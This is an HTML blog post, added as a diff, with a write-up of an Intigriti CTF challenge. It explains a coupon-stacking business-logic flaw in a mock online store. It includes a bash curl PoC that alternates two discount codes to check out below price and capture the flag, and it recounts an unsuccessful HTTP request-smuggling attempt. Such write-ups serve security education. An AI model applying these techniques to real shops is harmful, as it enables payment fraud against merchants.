@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>Intigriti | Challenge 1026 Writeup | Yours, Sto ʚɞ</title>
+
+    <link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Raleway:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap">
+
+      <script src="/js/main.js"></script>
+
+
+<meta name="description" content="One coupon, two coupons, three coupons, and the flag is yours ^.^">
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="Intigriti | Challenge 1026 Writeup">
+<meta property="og:description" content="One coupon, two coupons, three coupons, and the flag is yours ^.^">
+<meta property="og:image" content="http://localhost:1313/thumbnail.png">
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Intigriti | Challenge 1026 Writeup">
+<meta name="twitter:description" content="One coupon, two coupons, three coupons, and the flag is yours ^.^">
+<meta name="twitter:image" content="http://localhost:1313/thumbnail.png">
+
+
+<meta name="google-site-verification" content="HZuVMLvcO_JxYvwt6swb5-dfFikUHJW1aVEEvBvEDtI" />
+</head>
+<body>
+  <header>
+    <a href="/"><h3>Yours, Sto ʚɞ</h3></a>
+
+  <nav>
+    <ul>
+    <li>
+      <a href="/">Home</a>
+    </li>
+    <li>
+      <a aria-current="true" class="ancestor" href="/posts/">Posts</a>
+    </li>
+    <li>
+      <a href="/tags/">Tags</a>
+    </li>
+    <li>
+      <a href="/whoami/">Whoami</a>
+    </li>
+    </ul>
+  </nav>
+
+</div>
+
+  </header>
+  <main>
+    
+  <h1>Intigriti | Challenge 1026 Writeup</h1>
+
+    
+      <p class="date">Oct 23, 2026</p>
+    
+
+
+    
+    
+  <div class="tags">
+    
+    <ul>
+        <li><a href="/tags/business-logic/">#Business Logic</a></li>
+    </ul>
+  </div>
+
+    
+    <div class="content">
+      <p>Another Intigriti challenge and another writeup to detail its solution. The &ldquo;Halloween Store&rdquo; challenge involved an online store offering sweets. Our goal as players was to buy <em>The Midnight Collection</em>, the Halloween-themed archive that costs €666, while our balance was only €66. How? Well.. One, two, three coupons, and the flag is yours!</p>
+<h3 id="recon">Recon</h3>
+<p>We land on the <a href="https://challenge-1026.challenges.intigriti.io/">challenge page</a> and decide to explore <em>The Midnight Collection</em>. (Kudos to Globules for challenge UI, one could feel the automn vibes 🍂)</p>
+<p><img src="image-7.png" alt="alt text"></p>
+<p>We observe that we have a discount code, <code>NIGHT20</code>, and after subscribing to the newsletter, we obtain another discount code, <code>NEWS30</code>.</p>
+<p>We check the cart. After testing, we also see that a single application of either discount codes only reduces the total to a value still above our €66 credit. The <code>canCheckout</code> flag remains <code>false</code>. We need to accumulate more discount.</p>
+<p>But..
+We also observe a first issue with the discount code: it is not updated in real time. In other words, when we add items, then apply a code, then add new items, we see that the discount still apply only to the first batch.</p>
+<p>For instance, when adding two items and applying the discount code :
+<img src="image-3.png" alt="alt text"></p>
+<p>After adding another item :
+<img src="image-4.png" alt="alt text"></p>
+<p>To apply the discount to all items, i.e. the new total, we need to remove the code and reapply it.</p>
+<p>With this flaw, one could think that they can add a lot of items apply discount, then remove the items (and do not reapply the code to keep the original discount). However, we neither can remove items from the cart, nor can add the same item more than once to the cart.</p>
+<p>We need to find another solution.</p>
+<h3 id="the-logic-flaw">The Logic Flaw</h3>
+<p>The discount endpoint does not enforce a global &ldquo;one promotion per cart&rdquo; rule. It checks only that the specific code does not correspond to the latest one applied.</p>
+<p>This means two different codes can coexist, and each contributes its percentage independently. More importantly, the same code can be applied again after applying a different code, and the server does not track a &ldquo;has been used&rdquo; state per session.</p>
+<p>By alternating the (re)application of the two codes one after the other, the discount accumulates beyond the sum of the two percentages.</p>
+<h3 id="exploit">Exploit</h3>
+<ol>
+<li>Add <em>The Midnight Collection</em> to the cart (€666.00).</li>
+<li>Apply <code>NIGHT20</code>: <code>discount: €133.20</code>, <code>total: €532.80</code>.</li>
+<li>Apply <code>NEWS30</code> : the server accepts both codes; <code>discount</code> becomes €133.20 + €199.80 = €333.00, <code>total: €333.00</code>.</li>
+<li>Apply <code>NIGHT20</code> again. The server does not reject it. The discount grows because the server adds the new discount to the existing total, and updates the count of <code>NIGHT20</code> to two.</li>
+<li>Repeat by alternating the two codes, until <code>canCheckout</code> becomes <code>true</code>.</li>
+</ol>
+<h3 id="poc">PoC</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#! /bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;challenge-1026.challenges.intigriti.io&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># getting our session cookie</span>
+</span></span><span style="display:flex;"><span>printf <span style="color:#e6db74">&#34;\e[1;34msession creation\e[0m\n&#34;</span>
+</span></span><span style="display:flex;"><span>session<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -sI <span style="color:#e6db74">&#34;https://</span>$host<span style="color:#e6db74">/api/session&#34;</span> | sed -n <span style="color:#e6db74">&#39;s/.*session=\([^;]*\);.*/\1/p&#39;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>cookie<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;session=</span>$session<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># subscribing to newsletter</span>
+</span></span><span style="display:flex;"><span>printf <span style="color:#e6db74">&#34;\e[1;34mnewsletter sub\e[0m\n&#34;</span>
+</span></span><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;https://</span>$host<span style="color:#e6db74">/api/newsletter&#34;</span> -H <span style="color:#e6db74">&#34;Cookie: </span>$cookie<span style="color:#e6db74">&#34;</span> -X POST --data-raw <span style="color:#e6db74">&#39;{&#34;email&#34;:&#34;test@test.test&#34;}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># adding the midnight collection</span>
+</span></span><span style="display:flex;"><span>printf <span style="color:#e6db74">&#34;\e[1;34m\nadding the collection\e[0m\n&#34;</span>
+</span></span><span style="display:flex;"><span>curl -s -X POST <span style="color:#e6db74">&#34;https://</span>$host<span style="color:#e6db74">/api/cart/items&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -H <span style="color:#e6db74">&#34;Cookie: </span>$cookie<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --data-raw <span style="color:#e6db74">&#39;{&#34;productId&#34;:&#34;midnight-vault&#34;}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>1..2<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span>  <span style="color:#75715e"># actually twice is enough in our case ^^</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>printf <span style="color:#e6db74">&#34;\e[1;34m\nDiscount Application </span>$i<span style="color:#e6db74">\e[0m \n&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># applying 1st code</span>
+</span></span><span style="display:flex;"><span>printf <span style="color:#e6db74">&#34;\e[1;35m \n Code 1\e[0m \n&#34;</span>
+</span></span><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;https://</span>$host<span style="color:#e6db74">/api/cart/coupon&#34;</span> -X POST -H <span style="color:#e6db74">&#34;Cookie: </span>$cookie<span style="color:#e6db74">&#34;</span> --data-raw <span style="color:#e6db74">&#39;{&#34;code&#34;:&#34;NIGHT20&#34;}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># applying 2nd code</span>
+</span></span><span style="display:flex;"><span>printf <span style="color:#e6db74">&#34;\e[1;35m \n Code 2\e[0m \n&#34;</span>
+</span></span><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;https://</span>$host<span style="color:#e6db74">/api/cart/coupon&#34;</span> -X POST -H <span style="color:#e6db74">&#34;Cookie: </span>$cookie<span style="color:#e6db74">&#34;</span> --data-raw <span style="color:#e6db74">&#39;{&#34;code&#34;:&#34;NEWS30&#34;}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># checkout</span>
+</span></span><span style="display:flex;"><span>printf <span style="color:#e6db74">&#34;\e[1;34m\ncheckout and flag\e[0m\n&#34;</span>
+</span></span><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;https://</span>$host<span style="color:#e6db74">/api/checkout&#34;</span> -X POST -H <span style="color:#e6db74">&#34;Cookie: </span>$cookie<span style="color:#e6db74">&#34;</span> --data-raw <span style="color:#e6db74">&#39;{}&#39;</span> | jq .receipt.flag
+</span></span></code></pre></div><p>The flag is returned in the receipt : <strong>INTIGRITI{094638e6-ba2f-4c50-8bb4-41ced0d5debd}</strong>
+<img src="image-1.png" alt="alt text"></p>
+<hr>
+<h2 id="halloween-store---the-journey-">Halloween Store - The journey :</h2>
+<p>Writing the solution directly makes it seem a bit straightforward, but tbh, I first noticed another weird observation before discovering the coupon bug and spent some hours digging into it as I thought it was the way to the flag.</p>
+<p>Basically, when navigating through the site, sometimes I obtained code <code>501 Method Not Implemented</code> with a message such as <code>Unsupported method ('{&quot;productId&quot;:&quot;truffle&quot;}POST')</code> or <code>Unsupported method ('{&quot;urls&quot;:[&quot;http://example.com&quot;],...}GET')</code>. This was a red herring caused by request smuggling desynchronization on backend.</p>
+<p>Likely, the front-end forwards HTTP/2 requests to a Python <code>http.server</code> backend. When a request arrives with a <code>Content-Length</code> that does not match the actual body bytes, the extra bytes remain in the backend socket buffer. The next request on that connection is then prefixed with those leftover bytes, causing Python to parse an invalid method such as <code>{&quot;productId&quot;:&quot;truffle&quot;}POST</code> and return a <code>501</code>.</p>
+<p>I spent considerable time trying to weaponize this. I successfully smuggled requests that added items for instance (confirmed by the cart response), but did not succeed to go further with this to extract the flag.</p>
+<p>For instance, when sending the following request :
+<img src="image-5.png" alt="alt text"></p>
+<p>The berries got added to the cart.
+<img src="image-6.png" alt="alt text"></p>
+<p>The lesson when looking back at both vulns, it’s a reminder of how hacking actually goes!
+We found a 501 desync fingerprint with that tiny JSON body stuck tight to the method. But because the backend re-validated the smuggled request, our desync turned out to be just a diagnostic curiosity instead of a usable exploit. Task failed successfully :&rsquo;) ?</p>
+<p>In the end, the path to the flag was much more down-to-earth : The server just trusted the client to handle the promotion lifecycle and missed a check regarding the global use of a discouunt code in the session which let us stack several discounts. In a nutshell, the simple little logic flaw is the one that has the bigger impact.</p>
+
+    </div>
+    
+
+  </div>
+
+
+  </main>
+  <footer>
+    
+<p>© 2026 Sto ʚɞ. All rights reserved.</p>
+  </footer>
+</body>
+</html>
